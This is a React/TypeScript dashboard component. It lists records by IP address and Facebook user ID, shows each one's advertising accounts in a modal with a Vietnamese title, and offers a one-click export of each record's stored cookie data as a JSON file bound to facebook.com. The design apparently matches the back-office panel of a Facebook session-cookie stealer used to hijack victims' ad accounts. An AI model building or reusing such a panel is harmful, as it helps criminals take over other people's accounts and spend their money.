import "./style.scss";

import ModelForm from "./Model";
import { cookIpData } from "./helper";
import { useTranslation } from "react-i18next";
import React, { useMemo, useState } from "react";
import { Table, TablePaginationConfig } from "antd";
import { getAdsInfoColumns, getIpTableColumns } from "./tableColumns";
import DashboardRepository from "data/repositories/DashboardRespository";

export default function Dashboard() {
  const { t } = useTranslation();
  const dashboardRepository = new DashboardRepository();

  const [open, setOpen] = useState(false);
  const [loading, setLoading] = useState(false);
  const [detailLoading, setDetailLoading] = useState(false);

  const [tableData, setTableData] = useState<any>([]);
  const [tableModalData, setTableModalData] = useState<any>([]);
  const [pagination, setPagination] = useState<TablePaginationConfig>({
    total: 0,
    current: 1,
    pageSize: 10,
  });

  const columns: any = getIpTableColumns(viewDetail, exportData);
  const adsInfoColumns: any = getAdsInfoColumns();

  useMemo(() => {
    setLoading(true);
    dashboardRepository
      .getTableData(pagination.current as any, pagination.pageSize as any)
      .then((results: any) => {
        setPagination(pre => ({ ...pre, total: results.total }))
        setTableData(cookIpData(results.data));
        return;
      })
      .finally(() => setLoading(false));
  }, []);

  function viewDetail(id: any) {
    setOpen(true);
    setDetailLoading(true);
    dashboardRepository
      .getListAdAccounts(id.fbUid)
      .then((results: any) => {
        // setPagination(pre => ({ ...pre, total: results.totals }))
        setTableModalData(results.data);
        return;
      })
      .finally(() => setDetailLoading(false));
  }

  function exportData(data: any) {
    const jsonContent = {
      cookies: JSON.parse(data.cookieData),
      url: "https://www.facebook.com",
    };
    const jsonString = `data:text/json;chatset=utf-8,${encodeURIComponent(JSON.stringify(jsonContent))}`;
    const link = document.createElement("a");
    link.href = jsonString;
    link.download = `facebook-${data.ipAddress}-${new Date().getDate()}-${new Date().getMonth() + 1}.json`;
    link.click();
  }

  function onChangePage(page: any, pageSize: any) {
    setLoading(true);
    dashboardRepository
      .getTableData(page, pageSize)
      .then((results: any) => {
        setPagination(pre => ({ ...pre, current: page }))
        setTableData(cookIpData(results.data));
        return;
      })
      .finally(() => setLoading(false));
  }

  return (
    <div className="admin-dashboard-container">
      <Table
        bordered
        columns={columns}
        loading={loading}
        dataSource={tableData}
        pagination={{ ...pagination, onChange: onChangePage }}
      />
      <ModelForm
        open={open}
        onCancel={() => setOpen(false)}
        title="Danh sách tài khoản quảng cáo"
      >
        <Table
          bordered
          loading={detailLoading}
          columns={adsInfoColumns}
          dataSource={tableModalData}
        />
      </ModelForm>
    </div>
  );
}
